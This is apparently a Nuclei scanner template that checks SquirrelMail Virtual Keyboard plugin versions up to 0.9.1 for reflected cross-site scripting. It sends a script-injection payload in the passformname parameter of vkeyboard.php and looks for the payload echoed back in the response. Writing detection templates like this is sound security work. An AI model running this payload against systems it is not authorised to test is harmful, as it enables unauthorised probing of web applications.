id: squirrelmail-vkeyboard-xss

info:
  name: SquirrelMail Virtual Keyboard <=0.9.1 - 跨站脚本漏洞
  author: dhiyaneshDk
  severity: medium
  description: SquirrelMail Virtual Keyboard <=0.9.1 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  reference:
    - https://www.exploit-db.com/exploits/34814
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80,CWE-83
  metadata:
    max-request: 1
  tags: xss,squirrelmail,plugin,edb,vuln
variables:
  payload: "\"><script>alert({{rand_int()}});</script><script>/*"

http:
  - method: GET
    path:
      - '{{BaseURL}}/plugins/vkeyboard/vkeyboard.php?passformname={{url_encode(payload)}}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - 'onclick="window.opener.document.forms[0].{{payload}}'
        part: body

      - type: word
        words:
          - "text/html"
        part: header
